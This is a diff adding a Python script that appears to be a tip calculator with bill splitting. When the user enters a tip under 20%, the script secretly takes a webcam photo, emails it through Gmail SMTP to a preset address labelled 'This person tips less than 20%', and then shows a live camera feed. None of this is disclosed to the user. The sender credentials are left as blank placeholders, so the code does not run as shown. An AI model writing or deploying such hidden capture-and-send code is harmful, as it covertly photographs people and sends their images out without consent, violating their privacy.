@@ -1,0 +1,126 @@
+# ONLY WORKS AS AN EXECUTABLE
+# IF DONE NOT AS AN EXECUTABLE THEN CHANGED TO AN EXECUTABLE MIGHT BREAK IDK
+# IF IT BREAKS JUST DELETE THE NEWPICTURE.JPG FORM THE FILE (pycharm project files)
+# SOME STUFF IS LEFT OUT BECAUSE YOU HAVE TO ENTER IT BEFORE FINISHING THE PROJECT (The emails)
+
+
+import cv2
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+
+
+# yafugsa77f
+def send_mail(body):
+    sender_email = #Put email of the account sending
+    receiver_email = #Put email of the account receving
+
+    msg = MIMEMultipart()
+    msg['Subject'] = '[Email Test]'
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+
+    msgText = MIMEText('<b>%s</b>' % (body), 'html')
+    msg.attach(msgText)
+
+    with open('NewPicture.jpg', 'rb') as fp:
+        img = MIMEImage(fp.read())
+        img.add_header('Content-Disposition', 'attachment', filename="NewPicture.jpg")
+        msg.attach(img)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as smtpObj:
+            smtpObj.ehlo()
+            smtpObj.starttls()
+            smtpObj.login(sender_email, #password of sender email)
+            smtpObj.sendmail(sender_email, receiver_email, msg.as_string())
+            print("Email sent successfully")
+    except Exception as e:
+        print(e)
+
+
+
+
+
+# GAKMGSK
+def this_you():
+    # define a video capture object
+    vid = cv2.VideoCapture(1)
+
+    while (True):
+
+        # Capture the video frame
+        # by frame
+        ret, frame = vid.read()
+
+        # Display the resulting frame
+        cv2.imshow('This you?', frame)
+
+        # the 'q' button is set as the
+        # quitting button you may use any
+        # desired button of your choice
+        if cv2.waitKey(1) & 0xFF == ord('q'):
+            break
+
+    # After the loop release the cap object
+    vid.release()
+    # Destroy all the windows
+    cv2.destroyAllWindows()
+
+def this_you_pic():
+    videoCaptureObject = cv2.VideoCapture(1)
+    result = True
+    while (result):
+        ret, frame = videoCaptureObject.read()
+        cv2.imwrite("NewPicture.jpg", frame)
+        result = False
+    videoCaptureObject.release()
+    cv2.destroyAllWindows()
+
+
+
+bill = input("how much was the bill? ")
+billAmt = float(bill)
+tip = input("What percent would you like to tip (without %) ")
+tipAmt = float(tip)
+if tipAmt < 20:
+    print("Calculating tip")
+    this_you_pic()
+    send_mail("This person tips less than 20%")
+    this_you()
+
+percent = tipAmt / 100
+
+tip_final = billAmt * percent
+
+total_cost = billAmt + tip_final
+
+tip_round = round(tip_final, 2)
+total_round = round(total_cost, 2)
+
+print("You will tip your server $" + str(tip_round) + ". The bill is " + str(total_round))
+
+split = 0
+
+split = input("Are you splitting this with multiple people?(yes/no) ")
+
+while split != 0:
+
+
+    if split == "yes":
+        people = input("How many people? ")
+        people_int = int(people)
+
+        each_person = total_cost / people_int
+        each_person_round = round(each_person, 2)
+
+        print("each person would owe a total of $" + str(each_person_round) + " if you split the bill evenly.")
+        split = 0
+
+    elif split == "no":
+        print("Thank you for using this app!")
+        split = 0
+    else:
+        print("i no understand ")
+        split = input("Are you splitting this with multiple people?(yes/no) ")
